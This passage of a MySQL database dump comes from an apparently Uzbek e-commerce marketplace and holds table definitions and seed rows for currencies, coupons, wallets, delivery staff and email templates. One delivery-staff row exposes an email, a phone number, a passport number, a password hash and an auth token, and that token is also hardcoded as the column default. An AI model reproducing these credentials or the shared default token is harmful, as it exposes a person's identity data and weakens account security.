(135,'LightGrey','#D3D3D3','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(136,'Silver','#C0C0C0','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(137,'DarkGray','#A9A9A9','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(138,'Gray','#808080','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(139,'DimGray','#696969','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(140,'LightSlateGray','#778899','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(141,'SlateGray','#708090','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(142,'DarkSlateGray','#2F4F4F','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(143,'Black','#000000','2018-11-05 02:12:30','2018-11-05 02:12:30');
/*!40000 ALTER TABLE `colors` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `contacts`
--

DROP TABLE IF EXISTS `contacts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `contacts` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) DEFAULT NULL,
  `email` varchar(191) DEFAULT NULL,
  `mobile_number` varchar(191) NOT NULL,
  `subject` varchar(191) NOT NULL,
  `message` text NOT NULL,
  `seen` tinyint(1) NOT NULL DEFAULT 0,
  `feedback` varchar(191) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `reply` longtext DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `contacts`
--

LOCK TABLES `contacts` WRITE;
/*!40000 ALTER TABLE `contacts` DISABLE KEYS */;
/*!40000 ALTER TABLE `contacts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `coupons`
--

DROP TABLE IF EXISTS `coupons`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `coupons` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `added_by` varchar(191) NOT NULL DEFAULT 'admin',
  `coupon_type` varchar(50) DEFAULT NULL,
  `coupon_bearer` varchar(191) NOT NULL DEFAULT 'inhouse',
  `seller_id` bigint(20) DEFAULT NULL COMMENT 'NULL=in-house, 0=all seller',
  `customer_id` bigint(20) DEFAULT NULL COMMENT '0 = all customer',
  `title` varchar(100) DEFAULT NULL,
  `code` varchar(15) DEFAULT NULL,
  `start_date` date DEFAULT NULL,
  `expire_date` date DEFAULT NULL,
  `min_purchase` decimal(8,2) NOT NULL DEFAULT 0.00,
  `max_discount` decimal(8,2) NOT NULL DEFAULT 0.00,
  `discount` decimal(8,2) NOT NULL DEFAULT 0.00,
  `discount_type` varchar(15) NOT NULL DEFAULT 'percentage',
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `limit` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `coupons`
--

LOCK TABLES `coupons` WRITE;
/*!40000 ALTER TABLE `coupons` DISABLE KEYS */;
/*!40000 ALTER TABLE `coupons` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `currencies`
--

DROP TABLE IF EXISTS `currencies`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `currencies` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) NOT NULL,
  `symbol` varchar(191) NOT NULL,
  `code` varchar(191) NOT NULL,
  `exchange_rate` varchar(191) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `currencies`
--

LOCK TABLES `currencies` WRITE;
/*!40000 ALTER TABLE `currencies` DISABLE KEYS */;
INSERT INTO `currencies` VALUES
(1,'USD','$','USD','1',1,NULL,'2021-06-27 13:39:37'),
(2,'BDT','৳','BDT','84',1,NULL,'2021-07-06 11:52:58'),
(3,'Indian Rupi','₹','INR','60',1,'2020-10-15 17:23:04','2021-06-04 18:26:38'),
(4,'Euro','€','EUR','100',1,'2021-05-25 21:00:23','2021-06-04 18:25:29'),
(5,'YEN','¥','JPY','110',1,'2021-06-10 22:08:31','2021-06-26 14:21:10'),
(6,'Ringgit','RM','MYR','4.16',1,'2021-07-03 11:08:33','2021-07-03 11:10:37'),
(7,'Rand','R','ZAR','14.26',1,'2021-07-03 11:12:38','2021-07-03 11:12:42'),
(8,'O‘zbekiston so‘mi','so\'m','UZS','1',0,'2025-06-27 14:00:00','2025-06-27 14:00:00');
/*!40000 ALTER TABLE `currencies` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `customer_wallet_histories`
--

DROP TABLE IF EXISTS `customer_wallet_histories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `customer_wallet_histories` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `customer_id` bigint(20) DEFAULT NULL,
  `transaction_amount` decimal(8,2) NOT NULL DEFAULT 0.00,
  `transaction_type` varchar(20) DEFAULT NULL,
  `transaction_method` varchar(30) DEFAULT NULL,
  `transaction_id` varchar(20) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `customer_wallet_histories`
--

LOCK TABLES `customer_wallet_histories` WRITE;
/*!40000 ALTER TABLE `customer_wallet_histories` DISABLE KEYS */;
/*!40000 ALTER TABLE `customer_wallet_histories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `customer_wallets`
--

DROP TABLE IF EXISTS `customer_wallets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `customer_wallets` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `customer_id` bigint(20) DEFAULT NULL,
  `balance` decimal(8,2) NOT NULL DEFAULT 0.00,
  `royality_points` decimal(8,2) NOT NULL DEFAULT 0.00,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `customer_wallets`
--

LOCK TABLES `customer_wallets` WRITE;
/*!40000 ALTER TABLE `customer_wallets` DISABLE KEYS */;
/*!40000 ALTER TABLE `customer_wallets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `deal_of_the_days`
--

DROP TABLE IF EXISTS `deal_of_the_days`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `deal_of_the_days` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(150) DEFAULT NULL,
  `product_id` bigint(20) DEFAULT NULL,
  `discount` decimal(8,2) NOT NULL DEFAULT 0.00,
  `discount_type` varchar(12) NOT NULL DEFAULT 'amount',
  `status` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `deal_of_the_days`
--

LOCK TABLES `deal_of_the_days` WRITE;
/*!40000 ALTER TABLE `deal_of_the_days` DISABLE KEYS */;
/*!40000 ALTER TABLE `deal_of_the_days` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `delivery_country_codes`
--

DROP TABLE IF EXISTS `delivery_country_codes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `delivery_country_codes` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `country_code` varchar(191) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `delivery_country_codes`
--

LOCK TABLES `delivery_country_codes` WRITE;
/*!40000 ALTER TABLE `delivery_country_codes` DISABLE KEYS */;
/*!40000 ALTER TABLE `delivery_country_codes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `delivery_histories`
--

DROP TABLE IF EXISTS `delivery_histories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `delivery_histories` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint(20) DEFAULT NULL,
  `deliveryman_id` bigint(20) DEFAULT NULL,
  `time` datetime DEFAULT NULL,
  `longitude` varchar(191) DEFAULT NULL,
  `latitude` varchar(191) DEFAULT NULL,
  `location` varchar(191) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `delivery_histories`
--

LOCK TABLES `delivery_histories` WRITE;
/*!40000 ALTER TABLE `delivery_histories` DISABLE KEYS */;
/*!40000 ALTER TABLE `delivery_histories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `delivery_man_transactions`
--

DROP TABLE IF EXISTS `delivery_man_transactions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `delivery_man_transactions` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `delivery_man_id` bigint(20) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `user_type` varchar(20) NOT NULL,
  `transaction_id` char(36) NOT NULL,
  `debit` decimal(50,2) NOT NULL DEFAULT 0.00,
  `credit` decimal(50,2) NOT NULL DEFAULT 0.00,
  `transaction_type` varchar(20) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `delivery_man_transactions`
--

LOCK TABLES `delivery_man_transactions` WRITE;
/*!40000 ALTER TABLE `delivery_man_transactions` DISABLE KEYS */;
/*!40000 ALTER TABLE `delivery_man_transactions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `delivery_men`
--

DROP TABLE IF EXISTS `delivery_men`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `delivery_men` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `seller_id` bigint(20) DEFAULT NULL,
  `f_name` varchar(100) DEFAULT NULL,
  `l_name` varchar(100) DEFAULT NULL,
  `address` text DEFAULT NULL,
  `country_code` varchar(20) DEFAULT NULL,
  `phone` varchar(20) NOT NULL,
  `email` varchar(100) DEFAULT NULL,
  `identity_number` varchar(30) DEFAULT NULL,
  `identity_type` varchar(50) DEFAULT NULL,
  `identity_image` varchar(191) DEFAULT NULL,
  `image` varchar(100) DEFAULT NULL,
  `password` varchar(100) NOT NULL,
  `bank_name` varchar(191) DEFAULT NULL,
  `branch` varchar(191) DEFAULT NULL,
  `account_no` varchar(191) DEFAULT NULL,
  `holder_name` varchar(191) DEFAULT NULL,
  `is_active` tinyint(1) NOT NULL DEFAULT 1,
  `is_online` tinyint(4) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `auth_token` varchar(191) NOT NULL DEFAULT '6yIRXJRRfp78qJsAoKZZ6TTqhzuNJ3TcdvPBmk6n',
  `fcm_token` varchar(191) DEFAULT NULL,
  `app_language` varchar(191) NOT NULL DEFAULT 'en',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `delivery_men`
--

LOCK TABLES `delivery_men` WRITE;
/*!40000 ALTER TABLE `delivery_men` DISABLE KEYS */;
INSERT INTO `delivery_men` VALUES
(1,0,'BTS','Pochta','Tashkent','+7','888112309','delivery@jscorp.uz','AD1555325','passport','[{\"image_name\":\"2025-07-11-687152549f858.webp\",\"storage\":\"public\"}]','2025-07-11-6871525616cbb.webp','$2y$10$QdyBFRnq8E6RCo/zoFZ78.F86Mzmgohkfh.PFVawhq/lXbwykiGVy',NULL,NULL,NULL,NULL,1,1,'2025-07-11 22:47:53','2025-07-11 23:05:10','6yIRXJRRfp78qJsAoKZZ6TTqhzuNJ3TcdvPBmk6n',NULL,'en');
/*!40000 ALTER TABLE `delivery_men` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `delivery_zip_codes`
--

DROP TABLE IF EXISTS `delivery_zip_codes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `delivery_zip_codes` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `zipcode` varchar(191) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `delivery_zip_codes`
--

LOCK TABLES `delivery_zip_codes` WRITE;
/*!40000 ALTER TABLE `delivery_zip_codes` DISABLE KEYS */;
/*!40000 ALTER TABLE `delivery_zip_codes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `deliveryman_notifications`
--

DROP TABLE IF EXISTS `deliveryman_notifications`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `deliveryman_notifications` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `delivery_man_id` bigint(20) NOT NULL,
  `order_id` bigint(20) NOT NULL,
  `description` varchar(191) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `deliveryman_notifications`
--

LOCK TABLES `deliveryman_notifications` WRITE;
/*!40000 ALTER TABLE `deliveryman_notifications` DISABLE KEYS */;
INSERT INTO `deliveryman_notifications` VALUES
(1,1,100001,'customize your delivery man charge message','2025-07-11 23:02:29','2025-07-11 23:02:29'),
(2,1,100001,'customize your delivery man charge message','2025-07-11 23:03:29','2025-07-11 23:03:29'),
(3,1,100001,'customize your delivery man charge message','2025-07-11 23:06:14','2025-07-11 23:06:14');
/*!40000 ALTER TABLE `deliveryman_notifications` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `deliveryman_wallets`
--

DROP TABLE IF EXISTS `deliveryman_wallets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `deliveryman_wallets` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `delivery_man_id` bigint(20) NOT NULL,
  `current_balance` decimal(50,2) NOT NULL DEFAULT 0.00,
  `cash_in_hand` decimal(50,2) NOT NULL DEFAULT 0.00,
  `pending_withdraw` decimal(50,2) NOT NULL DEFAULT 0.00,
  `total_withdraw` decimal(50,2) NOT NULL DEFAULT 0.00,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `deliveryman_wallets`
--

LOCK TABLES `deliveryman_wallets` WRITE;
/*!40000 ALTER TABLE `deliveryman_wallets` DISABLE KEYS */;
/*!40000 ALTER TABLE `deliveryman_wallets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `digital_product_authors`
--

DROP TABLE IF EXISTS `digital_product_authors`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `digital_product_authors` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `author_id` int(11) NOT NULL,
  `product_id` int(11) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `digital_product_authors`
--

LOCK TABLES `digital_product_authors` WRITE;
/*!40000 ALTER TABLE `digital_product_authors` DISABLE KEYS */;
/*!40000 ALTER TABLE `digital_product_authors` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `digital_product_otp_verifications`
--

DROP TABLE IF EXISTS `digital_product_otp_verifications`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `digital_product_otp_verifications` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_details_id` varchar(255) DEFAULT NULL,
  `identity` varchar(255) DEFAULT NULL,
  `token` varchar(255) DEFAULT NULL,
  `otp_hit_count` tinyint(4) NOT NULL DEFAULT 0,
  `is_temp_blocked` tinyint(1) NOT NULL DEFAULT 0,
  `temp_block_time` timestamp NULL DEFAULT NULL,
  `expires_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `digital_product_otp_verifications`
--

LOCK TABLES `digital_product_otp_verifications` WRITE;
/*!40000 ALTER TABLE `digital_product_otp_verifications` DISABLE KEYS */;
/*!40000 ALTER TABLE `digital_product_otp_verifications` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `digital_product_publishing_houses`
--

DROP TABLE IF EXISTS `digital_product_publishing_houses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `digital_product_publishing_houses` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `publishing_house_id` int(11) NOT NULL,
  `product_id` int(11) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `digital_product_publishing_houses`
--

LOCK TABLES `digital_product_publishing_houses` WRITE;
/*!40000 ALTER TABLE `digital_product_publishing_houses` DISABLE KEYS */;
/*!40000 ALTER TABLE `digital_product_publishing_houses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `digital_product_variations`
--

DROP TABLE IF EXISTS `digital_product_variations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `digital_product_variations` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `variant_key` varchar(255) DEFAULT NULL,
  `sku` varchar(255) DEFAULT NULL,
  `price` decimal(24,8) DEFAULT NULL,
  `file` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `digital_product_variations`
--

LOCK TABLES `digital_product_variations` WRITE;
/*!40000 ALTER TABLE `digital_product_variations` DISABLE KEYS */;
/*!40000 ALTER TABLE `digital_product_variations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `email_templates`
--

DROP TABLE IF EXISTS `email_templates`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `email_templates` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `template_name` varchar(191) NOT NULL,
  `user_type` varchar(191) NOT NULL,
  `template_design_name` varchar(191) NOT NULL,
  `title` varchar(191) DEFAULT NULL,
  `body` text DEFAULT NULL,
  `banner_image` varchar(191) DEFAULT NULL,
  `image` varchar(191) DEFAULT NULL,
  `logo` varchar(191) DEFAULT NULL,
  `button_name` varchar(191) DEFAULT NULL,
  `button_url` varchar(191) DEFAULT NULL,
  `footer_text` varchar(191) DEFAULT NULL,
  `copyright_text` varchar(191) DEFAULT NULL,
  `pages` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`pages`)),
  `social_media` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`social_media`)),
  `hide_field` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`hide_field`)),
  `button_content_status` tinyint(4) NOT NULL DEFAULT 1,
  `product_information_status` tinyint(4) NOT NULL DEFAULT 1,
  `order_information_status` tinyint(4) NOT NULL DEFAULT 1,
  `status` tinyint(4) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `email_templates`
--

LOCK TABLES `email_templates` WRITE;
/*!40000 ALTER TABLE `email_templates` DISABLE KEYS */;
INSERT INTO `email_templates` VALUES
(1,'order-received','admin','order-received','New Order Received','<p><b>Hi {adminName},</b></p><p>We have sent you this email to notify that you have a new order.You will be able to see your orders after login to your panel.</p>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"icon\",\"product_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(2,'order-place','customer','order-place','Order # {orderId} Has Been Placed Successfully!','<p><b>Hi {userName},</b></p><p>Your order from {shopName} has been placed to know the current status of your order click track order</p>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"icon\",\"product_information\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(3,'registration-verification','customer','registration-verification','Registration Verification','<p><b>Hi {userName},</b></p><p>Your verification code is</p>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(4,'registration-from-pos','customer','registration-from-pos','Registration Complete','<p><b>Hi {userName},</b></p><p>Thank you for joining  Shop.If you want to become a registered customer then reset your password below by using this email. Then you’ll be able to explore the website and app as a registered customer.</p>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_url\",\"button_content_status\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(5,'account-block','customer','account-block','Account Blocked','<div><b>Hi {userName},</b></div><div><b><br></b></div><div>Your account has been blocked due to suspicious activity by the admin .To resolve this issue please contact with admin or support center. We apologize for any inconvenience caused.</div><div><br></div><div>Meanwhile, click here to visit theshop website</div><div><font color=\"#0000ff\"> <a href=\"https://venu.uz\" target=\"_blank\">https://venu.uz</a></font></div>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(6,'account-unblock','customer','account-unblock','Account Unblocked','<div><b>Hi {userName},</b></div><div><b><br></b></div><div>Your account has been successfully unblocked. We appreciate your cooperation in resolving this issue. Thank you for your understanding and patience. </div><div><br></div><div>Meanwhile, click here to visit the shop website</div><div><font color=\"#0000ff\"> <a href=\"https://venu.uz\" target=\"_blank\">https://venu.uz</a></font></div>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(7,'digital-product-download','customer','digital-product-download','Congratulations','<p>Thank you for choosing  shop! Your digital product is ready for download. To download your product use your email <b>{emailId}</b> and order # {orderId} below.</b><br></p>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(8,'digital-product-otp','customer','digital-product-otp','Digital Product Download OTP Verification','<p><b>Hi {userName},</b></p><p>Your verification code is</p>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(9,'add-fund-to-wallet','customer','add-fund-to-wallet','Transaction Successful','<div style=\"text-align: center; \">Amount successfully credited to your wallet .</div><div style=\"text-align: center; \"><br></div>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(10,'registration','vendor','registration','Registration Complete','<div><b>Hi {vendorName},</b></div><div><b><br></b></div><div>Congratulation! Your registration request has been send to admin successfully! Please wait until admin reviewal. </div><div><br></div><div>meanwhile click here to visit the  Shop Website</div><div><font color=\"#0000ff\"> <a href=\"https://venu.uz\" target=\"_blank\">https://venu.uz</a></font></div>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(11,'registration-approved','vendor','registration-approved','Registration Approved','<div><b>Hi {vendorName},</b></div><div><b><br></b></div><div>Your registration request has been approved by admin. Now you can complete your store setting and start selling your product on  Shop. </div><div><br></div><div>Meanwhile, click here to visit the shop website</div><div><font color=\"#0000ff\"> <a href=\"https://venu.uz\" target=\"_blank\">https://venu.uz</a></font></div>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
